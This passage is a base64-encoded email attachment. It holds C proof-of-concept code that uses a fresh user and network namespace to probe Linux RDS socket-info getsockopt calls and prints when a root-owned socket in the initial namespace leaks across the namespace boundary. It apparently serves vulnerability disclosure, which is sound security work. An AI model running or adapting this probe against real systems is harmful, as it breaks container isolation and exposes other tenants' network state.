cmludGYoc3RkZXJyLCAiICAgIFslZF0gYm91bmQ9JXM6JXUgaW51bT0lbGx1IHNuZGJ1Zj0ldSBy
Y3ZidWY9JXVcbiIsCiAgICAgICAgICAgICAgICAgICAgaSwgYiwgbnRvaHMoc2lbaV0uYm91bmRf
cG9ydCksCiAgICAgICAgICAgICAgICAgICAgKHVuc2lnbmVkIGxvbmcgbG9uZylzaVtpXS5pbnVt
LAogICAgICAgICAgICAgICAgICAgIHNpW2ldLnNuZGJ1Ziwgc2lbaV0ucmN2YnVmKTsKICAgICAg
ICAgICAgaWYgKHNpW2ldLmJvdW5kX2FkZHIgPT0gaHRvbmwoMHg3ZjAwMDAwMSkgJiYKICAgICAg
ICAgICAgICAgIG50b2hzKHNpW2ldLmJvdW5kX3BvcnQpID09IFZJQ1RJTV9QT1JUKSB7CiAgICAg
ICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwKICAgICAgICAgICAgICAgICAgIiAgICAqKiogTEVB
SzogdGhpcyBpcyB0aGUgdmljdGltJ3MgaW5pdF9uZXQgc29ja2V0ICIKICAgICAgICAgICAgICAg
ICAgIigxMjcuMC4wLjE6JXUpIOKAlCB2aXNpYmxlIGZyb20gYXR0YWNrZXIncyBmcmVzaCBuZXRu
cyAqKipcbiIsCiAgICAgICAgICAgICAgICAgIFZJQ1RJTV9QT1JUKTsKICAgICAgICAgICAgfQog
ICAgICAgIH0KICAgIH0KfQoKc3RhdGljIHZvaWQgcHJvYmVfY291bnQoaW50IHMsIGludCBvcHQs
IGNvbnN0IGNoYXIgKndobykgewogICAgLyogbGVuPTAgLT4ga2VybmVsIHJldHVybnMgLUVOT1NQ
QyArIHRvdGFsIGluIG9wdGxlbiwgZXhwb3NpbmcgY291bnQgKi8KICAgIGNoYXIgYnVmWzFdOwog
ICAgc29ja2xlbl90IGxlbiA9IDA7CiAgICBpbnQgcmMgPSBnZXRzb2Nrb3B0KHMsIFNPTF9SRFMs
IG9wdCwgYnVmLCAmbGVuKTsKICAgIGZwcmludGYoc3RkZXJyLCAiWyVzXSBjb3VudC1wcm9iZSgl
cykgcmM9JWQgZXJybm89JWQgb3B0bGVuLWFmdGVyPSV1XG4iLAogICAgICAgICAgICB3aG8sIG9w
dF9uYW1lKG9wdCksIHJjLCBlcnJubywgKHVuc2lnbmVkKWxlbik7Cn0KCmludCBtYWluKHZvaWQp
CnsKICAgIC8qIFN0ZXAgMTogVmljdGltIHNvY2tldCBpbiBpbml0X25ldC4gKi8KICAgIGludCB2
ID0gc29ja2V0KEFGX1JEUywgU09DS19TRVFQQUNLRVQsIDApOwogICAgaWYgKHYgPCAwKSB7IHBl
cnJvcigidmljdGltIHNvY2tldChBRl9SRFMpIik7IHJldHVybiAyOyB9CiAgICBzdHJ1Y3Qgc29j
a2FkZHJfaW4gdnNpbiA9IHsgLnNpbl9mYW1pbHkgPSBBRl9JTkVULAogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIC5zaW5fcG9ydCA9IGh0b25zKFZJQ1RJTV9QT1JUKSB9OwogICAgaW5l
dF9wdG9uKEFGX0lORVQsICIxMjcuMC4wLjEiLCAmdnNpbi5zaW5fYWRkcik7CiAgICBpZiAoYmlu
ZCh2LCAoc3RydWN0IHNvY2thZGRyICopJnZzaW4sIHNpemVvZih2c2luKSkgPCAwKSB7CiAgICAg
ICAgcGVycm9yKCJ2aWN0aW0gYmluZCIpOyByZXR1cm4gMjsKICAgIH0KICAgIGZwcmludGYoc3Rk
ZXJyLCAiW3ZpY3RpbV0gQUZfUkRTIGJvdW5kIDEyNy4wLjAuMTolZCBpbiBpbml0X25ldCAocm9v
dClcbiIsCiAgICAgICAgICAgIFZJQ1RJTV9QT1JUKTsKCiAgICAvKiBTdGVwIDFiOiBwcm9iZSBm
cm9tIGluaXRfbmV0IHRvIGNvbmZpcm0gcmRzX2luZm8gd29ya3MgYXQgYWxsICovCiAgICBpbnQg
cHJvYmUgPSBzb2NrZXQoQUZfUkRTLCBTT0NLX1NFUVBBQ0tFVCwgMCk7CiAgICBpZiAocHJvYmUg
Pj0gMCkgewogICAgICAgIHByb2JlX2NvdW50KHByb2JlLCBSRFNfSU5GT19TT0NLRVRTLCAiaW5p
dC1wcm9iZSIpOwogICAgICAgIHByb2JlX29uZShwcm9iZSwgICBSRFNfSU5GT19TT0NLRVRTLCAi
aW5pdC1wcm9iZSIpOwogICAgICAgIHByb2JlX2NvdW50KHByb2JlLCBSRFNfSU5GT19UQ1BfU09D
S0VUUywgImluaXQtcHJvYmUiKTsKICAgICAgICBwcm9iZV9vbmUocHJvYmUsICAgUkRTX0lORk9f
Q09VTlRFUlMsICJpbml0LXByb2JlIik7CiAgICAgICAgY2xvc2UocHJvYmUpOwogICAgfQoKICAg
IC8qIFN0ZXAgMjogZm9yayBhdHRhY2tlciBpbnRvIGZyZXNoIHVzZXJfbnMgKyBuZXRucy4gKi8K
ICAgIGludCBwaXBlZmRbMl07IHBpcGUocGlwZWZkKTsKICAgIHBpZF90IHBpZCA9IGZvcmsoKTsK
ICAgIGlmIChwaWQgPT0gMCkgewogICAgICAgIGNsb3NlKHBpcGVmZFswXSk7CiAgICAgICAgaWYg
KHVuc2hhcmUoQ0xPTkVfTkVXVVNFUiB8IENMT05FX05FV05FVCkgPCAwKSB7CiAgICAgICAgICAg
IHBlcnJvcigidW5zaGFyZSIpOyBfZXhpdCgyKTsKICAgICAgICB9CiAgICAgICAgaW50IGZkOyBj
aGFyIGJbNjRdOyBpbnQgbjsKICAgICAgICBpZiAoKGZkID0gb3BlbigiL3Byb2Mvc2VsZi9zZXRn
cm91cHMiLCBPX1dST05MWSkpID49IDApIHsKICAgICAgICAgICAgd3JpdGUoZmQsICJkZW55Iiwg
NCk7IGNsb3NlKGZkKTsKICAgICAgICB9CiAgICAgICAgZmQgPSBvcGVuKCIvcHJvYy9zZWxmL3Vp
ZF9tYXAiLCBPX1dST05MWSk7CiAgICAgICAgbiA9IHNucHJpbnRmKGIsIHNpemVvZihiKSwgIjAg
MCAxXG4iKTsgd3JpdGUoZmQsIGIsIG4pOyBjbG9zZShmZCk7CiAgICAgICAgZmQgPSBvcGVuKCIv
cHJvYy9zZWxmL2dpZF9tYXAiLCBPX1dST05MWSk7CiAgICAgICAgbiA9IHNucHJpbnRmKGIsIHNp
emVvZihiKSwgIjAgMCAxXG4iKTsgd3JpdGUoZmQsIGIsIG4pOyBjbG9zZShmZCk7CgogICAgICAg
IGNoYXIgbnNhWzY0XTsgaW50IHJsID0gcmVhZGxpbmsoIi9wcm9jL3NlbGYvbnMvbmV0IiwgbnNh
LCA2Myk7CiAgICAgICAgaWYgKHJsID4gMCkgbnNhW3JsXSA9IDA7CiAgICAgICAgZnByaW50Zihz
dGRlcnIsICJbYXR0YWNrZXJdIGluIG5ldG5zPSVzIHVpZD0ldVxuIiwgbnNhLCBnZXR1aWQoKSk7
CgogICAgICAgIGludCBhID0gc29ja2V0KEFGX1JEUywgU09DS19TRVFQQUNLRVQsIDApOwogICAg
ICAgIGlmIChhIDwgMCkgeyBwZXJyb3IoIlthdHRhY2tlcl0gc29ja2V0KEFGX1JEUykiKTsgX2V4
aXQoMik7IH0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlthdHRhY2tlcl0gQUZfUkRTIG9wZW5l
ZCBpbiBmcmVzaCBuZXRucyAtPiBmZD0lZFxuIiwgYSk7CgogICAgICAgIHByb2JlX2NvdW50KGEs
IFJEU19JTkZPX1NPQ0tFVFMsICAgICAiYXR0YWNrZXIiKTsKICAgICAgICBwcm9iZV9vbmUoYSwg
ICBSRFNfSU5GT19TT0NLRVRTLCAgICAgImF0dGFja2VyIik7CiAgICAgICAgcHJvYmVfY291bnQo
YSwgUkRTX0lORk9fVENQX1NPQ0tFVFMsICJhdHRhY2tlciIpOwogICAgICAgIHByb2JlX29uZShh
LCAgIFJEU19JTkZPX1RDUF9TT0NLRVRTLCAiYXR0YWNrZXIiKTsKICAgICAgICBwcm9iZV9jb3Vu
dChhLCBSRFNfSU5GT19DT05ORUNUSU9OUywgImF0dGFja2VyIik7CiAgICAgICAgcHJvYmVfb25l
KGEsICAgUkRTX0lORk9fQ09VTlRFUlMsICAgICJhdHRhY2tlciIpOwoKICAgICAgICBjbG9zZShh
KTsKICAgICAgICB3cml0ZShwaXBlZmRbMV0sICJ4IiwgMSk7CiAgICAgICAgX2V4aXQoMCk7CiAg
ICB9CiAgICBjbG9zZShwaXBlZmRbMV0pOwogICAgY2hhciB0bXA7IHJlYWQocGlwZWZkWzBdLCAm
dG1wLCAxKTsKICAgIGludCBzdGF0dXM7IHdhaXRwaWQocGlkLCAmc3RhdHVzLCAwKTsKICAgIGNs
b3NlKHYpOwogICAgcmV0dXJuIDA7Cn0K

--_003_TYZPR01MB6758F43459242F22946A8192DC3E2TYZPR01MB6758apcp_--

